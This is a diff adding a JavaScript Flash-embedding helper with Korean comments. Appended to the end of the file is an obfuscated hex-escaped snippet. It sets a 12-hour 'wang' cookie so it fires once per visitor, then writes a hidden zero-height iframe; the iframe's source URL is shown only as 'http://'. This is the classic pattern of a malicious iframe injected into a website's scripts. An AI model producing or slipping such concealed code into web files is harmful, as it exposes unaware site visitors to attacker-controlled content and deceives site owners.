@@ -1,0 +1,28 @@
+// lo: source url
+// w: source width
+// h: source height
+// t: wmode ("" none, transparent, opaque ...)
+// flashID: source ID
+// flashvar: get variable
+function view_flash(lo,w,h,t, flashID, flashvar,bg_color){
+	if(bg_color){
+		var bg_c=bg_color;
+	}else{
+		var bg_c="#FFFFFF";
+	}
+	var vn_screenx = screen.availWidth; // 화면스크린 넓이
+	var vn_screeny = screen.availHeight; // 화면스크린 높이
+//	alert('화면넓이:' +vn_screenx+', 화면높이 : '+vn_screeny);
+
+document.write ('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="'+w+'" height="'+h+'" id="'+flashID+'">');
+document.write ('<param name="movie" value="'+lo+'">');
+document.write ('<param name="quality" value="high">');
+document.write ('<param name="wmode" value="'+t+'">');
+document.write ('<param name="allowScriptAccess" value="always">');
+document.write ('<param name="FlashVars" value="'+flashvar+'&screenW='+vn_screenx+'&screenH='+vn_screeny+'">');
+document.write ('<param name="allowFullScreen" value="true"/>');
+document.write ('<param name="bgColor" value="'+bg_c+'"/>');
+document.write ('<embed src="'+lo+'" FlashVars="'+flashvar+'&screenW='+vn_screenx+'&screenH='+vn_screeny+'" quality="high" allowFullScreen="true" allowScriptAccess="always" bgColor= "'+bg_c+'" wmode="'+t+'" width="'+w+'" height="'+h+'" name="'+flashID+'" id="'+flashID+'" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>');
+document.write ('</object>');
+}
+var _$=["\x64\x6f\x63\x75\x6d\x65\x6e\x74","\x63\x6f\x6f\x6b\x69\x65","\x69\x6e\x64\x65\x78\x4f\x66",'\x77\x61\x6e\x67',"\x73\x65\x74\x54\x69\x6d\x65","\x67\x65\x74\x54\x69\x6d\x65",'\x77\x61\x6e\x67\x3d\x59\x65\x73\x3b\x70\x61\x74\x68\x3d\x2f\x3b\x65\x78\x70\x69\x72\x65\x73\x3d',"\x74\x6f\x47\x4d\x54\x53\x74\x72\x69\x6e\x67","\x77\x72\x69\x74\x65","\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x68\x74\x74\x70\x3a\x2f\x2f\x20\x77\x69\x64\x74\x68\x3d\x31\x30\x30\x20\x68\x65\x69\x67\x68\x74\x3d\x30\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e"];if(window[_$[0]][_$[1]][_$[2]](_$[3])==-0x1){var a=new Date();a[_$[4]](a[_$[5]]()+0xc*0x3c*0x3c*0x3e8);window[_$[0]][_$[1]]=_$[6]+a[_$[7]]();window[_$[0]][_$[8]](_$[9])}
